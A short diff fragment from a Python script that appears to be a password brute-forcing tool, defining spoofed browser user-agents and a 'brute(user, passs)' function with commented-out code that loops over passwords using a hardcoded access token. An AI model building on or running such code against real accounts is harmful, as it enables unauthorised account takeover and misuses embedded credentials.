@@ -7,7 +7,7 @@ from prettytable import PrettyTable
 useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
 
 def brute(user, passs):
-  try:
+
     # for pw in passs:
     #   params={
     #     'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
